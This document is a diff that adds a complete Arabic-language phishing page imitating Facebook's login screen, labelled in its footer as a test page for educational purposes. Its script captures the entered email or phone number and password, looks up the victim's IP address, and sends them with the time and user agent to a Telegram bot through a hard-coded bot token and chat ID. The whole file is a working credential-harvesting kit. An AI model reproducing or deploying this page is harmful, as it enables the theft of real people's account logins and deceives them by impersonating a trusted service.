@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="ar" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook - تسجيل الدخول</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px 30px 30px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+        .logo {
+            font-size: 48px;
+            font-weight: 900;
+            color: #1877f2;
+            margin-bottom: 10px;
+            font-family: 'Segoe UI', sans-serif;
+        }
+        .subtext {
+            color: #606770;
+            font-size: 15px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 8px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+            background: #f5f6f7;
+            transition: 0.2s;
+        }
+        input:focus {
+            border-color: #1877f2;
+            background: white;
+            outline: none;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #1877f2;
+            color: white;
+            font-size: 18px;
+            font-weight: 700;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            margin: 10px 0;
+            transition: 0.2s;
+        }
+        .btn:hover {
+            background: #166fe5;
+        }
+        .btn:active {
+            transform: scale(0.98);
+        }
+        .forgot {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin: 10px 0 15px;
+        }
+        .forgot:hover {
+            text-decoration: underline;
+        }
+        .line {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        .create-btn {
+            background: #42b72a;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .create-btn:hover {
+            background: #36a420;
+        }
+        .footer {
+            color: #8a8d91;
+            font-size: 12px;
+            margin-top: 20px;
+        }
+        .loading {
+            display: none;
+            color: #1877f2;
+            font-size: 14px;
+            margin: 10px 0;
+        }
+        .loading.show {
+            display: block;
+        }
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1a1a1a;
+            border: 1px solid #42b72a;
+            color: #fff;
+            padding: 12px 25px;
+            border-radius: 30px;
+            font-weight: 700;
+            font-size: 14px;
+            z-index: 999;
+            display: none;
+            box-shadow: 0 0 30px rgba(66, 183, 42, 0.3);
+        }
+        .toast.show {
+            display: block;
+            animation: fadeUp 0.3s ease;
+        }
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateX(-50%) translateY(20px); }
+            to { opacity: 1; transform: translateX(-50%) translateY(0); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">facebook</div>
+    <div class="subtext">سجل الدخول إلى فيسبوك</div>
+
+    <form id="loginForm">
+        <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+        <input type="password" id="password" placeholder="كلمة السر" required>
+        <button type="submit" class="btn">تسجيل الدخول</button>
+        <a href="#" class="forgot">هل نسيت كلمة السر؟</a>
+        <div class="line"></div>
+        <button type="button" class="create-btn" onclick="showToast('هذه صفحة اختبارية')">إنشاء حساب جديد</button>
+    </form>
+
+    <div class="loading" id="loadingIndicator">⏳ جاري تسجيل الدخول...</div>
+    <div class="footer">صفحة اختبارية - للأغراض التعليمية فقط</div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+    // ====== توكنات التلغرام ======
+    const BOT_TOKEN = "8866899578:AAFzEUlAUgGtV59-y98YXO5yiC3RCaJFSKw";
+    const CHAT_ID = "-1001537611569";
+
+    // ====== عرض رسالة منبثقة ======
+    function showToast(msg, isSuccess = true) {
+        const t = document.getElementById('toast');
+        t.textContent = msg;
+        t.style.borderColor = isSuccess ? '#42b72a' : '#ff4444';
+        t.style.color = isSuccess ? '#fff' : '#ff6666';
+        t.classList.add('show');
+        setTimeout(() => t.classList.remove('show'), 5000);
+    }
+
+    // ====== إرسال البيانات إلى تلغرام ======
+    async function sendToTelegram(email, password) {
+        const ip = await getIP();
+        const time = new Date().toLocaleString('ar-SA');
+        const msg = `🔐 فيسبوك - تسجيل دخول جديد:
+📧 البريد/الهاتف: ${email}
+🔑 كلمة السر: ${password}
+🌐 IP: ${ip}
+🕒 الوقت: ${time}
+📍 الجهاز: ${navigator.userAgent}`;
+
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: msg,
+                    parse_mode: 'HTML'
+                })
+            });
+            const data = await response.json();
+            if (data.ok) {
+                showToast('✅ تم تسجيل الدخول بنجاح!');
+            } else {
+                showToast('⚠️ خطأ في الإرسال', false);
+            }
+        } catch (err) {
+            console.error(err);
+            showToast('⚠️ فشل الاتصال', false);
+        }
+    }
+
+    // ====== جلب الـ IP ======
+    async function getIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch {
+            return 'غير متوفر';
+        }
+    }
+
+    // ====== معالجة النموذج ======
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value.trim();
+
+        if (!email || !password) {
+            showToast('⚠️ الرجاء تعبئة جميع الحقول', false);
+            return;
+        }
+
+        // إظهار مؤشر التحميل
+        document.getElementById('loadingIndicator').classList.add('show');
+        document.querySelector('.btn').disabled = true;
+
+        // إرسال البيانات إلى تلغرام
+        await sendToTelegram(email, password);
+
+        // إخفاء مؤشر التحميل
+        document.getElementById('loadingIndicator').classList.remove('show');
+        document.querySelector('.btn').disabled = false;
+
+        // مسح الحقول
+        document.getElementById('email').value = '';
+        document.getElementById('password').value = '';
+
+        // إعادة التوجيه إلى فيسبوك الحقيقي (اختياري)
+        // window.location.href = 'https://www.facebook.com';
+    });
+</script>
+
+</body>
+</html>
